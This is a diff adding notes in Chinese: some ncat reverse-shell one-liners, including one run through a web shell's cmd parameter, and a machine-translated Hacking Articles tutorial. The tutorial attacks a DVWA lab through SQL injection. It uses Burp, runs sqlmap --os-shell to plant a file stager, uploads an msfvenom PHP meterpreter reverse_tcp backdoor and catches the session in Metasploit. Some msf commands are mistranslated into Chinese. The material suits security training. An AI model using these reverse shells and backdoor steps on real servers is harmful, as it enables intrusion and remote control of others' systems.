@@ -22,3 +22,115 @@ cmd.php?cmd=ncat 127.0.0.1 8081 -e /bin/sh
 ncat 192.168.50.213 8081 -e /bin/sh
 
 ncat -e 192.168.50.213 8081
+
+
+
+大家好！！你可能多次使用sqlmap进行SQL注入来获取web服务器的数据库信息。在本教程中，如果网站存在 SQL 漏洞，我将向您展示“如何上传任何后门以获取 meterpreter 会话”。
+
+表中的内容
+DVWA 实验室设置
+导航到易受 SQL 注入攻击的页面
+拦截浏览器请求（Burp-suite）
+将拦截数据保存在文本文件中
+提取数据库名称 (SQLMAP)
+生成 os-shell (SQLMAP)
+在浏览器中探索文件 Stager
+生成 PHP 后门 (msfvenom)
+运行多处理程序 (Metasploit)
+上传Msfvenom PHP Backdoor并执行
+获取Meterpreter Shell
+DVWA 实验室设置
+
+要求：
+Xampp/Wamp 服务器
+DVWA Web易受攻击的应用程序
+Kali Linux：Burp 套件、sqlmap 工具
+首先，您需要在 XAMPP 或 WAMP 服务器中安装 DVWA 实验室，从 此处阅读完整文章
+
+导航到易受 SQL 注入攻击的页面
+现在让我们通过网络浏览器导航到 DVWA 并使用以下凭据登录：
+
+用户名 ——admin
+
+密码 ——密码
+
+单击 DVWA Security 并将 Website  Security Level 设置为低
+
+从漏洞列表中为您的攻击选择 SQL 注入。 在文本框中键入 用户 ID：1 。不要在没有设置网络浏览器代理的情况下点击提交按钮。设置浏览器代理以使 burp 套件正常工作。  
+
+
+
+ 
+
+拦截浏览器请求
+现在让我们通过以下步骤拦截浏览器请求：
+
+在网络浏览器中设置网络代理后，打开 burp 套件。
+单击菜单栏中的代理，然后在按钮上进行拦截。
+返回并单击 dvwa 中的提交按钮。
+复制拦截的数据并保存在文本文件中。
+拦截按钮用于显示在您的浏览器和 Web 服务器之间传递的 HTTP 和 Web 套接字消息。Burp suit 将在获取的数据下提供“cookie”和“referrer”，可以直接在 sqlmap 命令中使用。
+
+
+
+提取数据库名称
+现在使用 sqlmap 进行 SQL 注入并运行以下命令来枚举数据库名称。
+
+sqlmap -r 文件 --dbs --batch
+这里的-r 选项用于分析来自“文件”的 HTTP 请求，您可以观察到它必须将DVWA转储为数据库名称。
+
+
+
+产卵壳
+现在键入以下命令以运行 sqlmap 以访问 Web 服务器 (dvwa) 的 os-shell
+
+sqlmap -r 文件 -D dvwa --os-shell
+它将尝试生成后门；如果你想在 web 服务器中上传 PHP 后门，则为  PHP 有效负载键入 4  。
+
+
+
+键入 4 进行暴力搜索以用作可写目录以上传它。
+
+它试图通过使用 SQL 注入技术将文件上传到“/xampp/htdocs/”。文件一上传；它会发送信息“文件暂存器已成功上传到/xampp/htdocs/ ”，你将获得受害者电脑的操作系统外壳。除了这里，它还显示了 file stager 的路径，你可以在其中手动上传你的后门，查看突出显示的 URL：
+
+http://192.168.1.105:80/tmpurufu.php
+
+
+在浏览器中探索 File Stager
+ 在浏览器中浏览 URL ：http://192.168.1.105/tmpurufu.php 。从下面给出的截图中，你可以看到网页标题“ sqlmap file uploader ”，它会让你在网络服务器（dvwa）上浏览你的后门，稍后我们可以在 /xampp/htdocs/ 目录上传那个后门网络服务器。
+
+
+
+生成PHP后门
+让我们用可以上传的 msfvenom 准备恶意 php 文件：
+
+msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.1.109 lport=4444 -f raw
+将代码从 <?php 复制到 die() 并将其保存在扩展名为 .php 的文件中。我已将后门程序保存为桌面上的shell.php，稍后将浏览此文件以上传到 Web 服务器上。另一方面，通过键入 msfconsole加载 Metasploit 框架 并启动 multi/handle。
+
+
+
+上传并执行 Msfvenom PHP 后门
+单击 浏览选项卡以选择您的后门文件(shell.php) 文件，然后单击 上传。
+
+
+
+伟大的！！！这里显示 Admin 文件已上传，这意味着后门 shell.php 已上传。
+
+
+
+在目标机器上执行后门文件，在浏览器中运行URL：192.168.1.105/shell.php，即可通过multi/handler接收到反向连接。
+
+
+
+获取Meterpreter Shell
+
+msf> 使用多/处理程序
+msf exploit(handler) > 设置 lport 4444
+msf exploit(handler) > 设置 lhost 192.168.1.109
+msf exploit(handler) > 设置负载 php/meterpreter/reverse_tcp
+msf 利用（处理程序）>利用
+神圣的！  这里我们有我们的 meterpreter session 1。
+
+
+
+作者：  Aarti Singh 是 Hacking Articles 的研究员和技术作家，信息安全顾问，社交媒体爱好者和小工具。 在这里联系
